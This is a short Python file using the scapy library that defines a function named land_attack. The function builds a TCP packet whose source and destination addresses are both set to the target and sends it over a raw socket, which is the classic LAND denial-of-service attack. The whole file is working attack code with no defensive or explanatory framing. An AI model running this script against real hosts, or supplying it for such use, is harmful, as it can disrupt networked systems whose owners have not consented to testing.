from scapy.config import conf
from scapy.layers.inet import IP, TCP
from scapy.sendrecv import send
from scapy.supersocket import L3RawSocket


def land_attack(target: str, source_port: int = 1001, destinatinon_port: int = 80):
    conf.L3socket = L3RawSocket

    ip_layer = IP()
    ip_layer.src = target
    ip_layer.dst = target
    tcp_layer = TCP()
    tcp_layer.sport = source_port
    tcp_layer.dport = destinatinon_port

    send(ip_layer / tcp_layer)
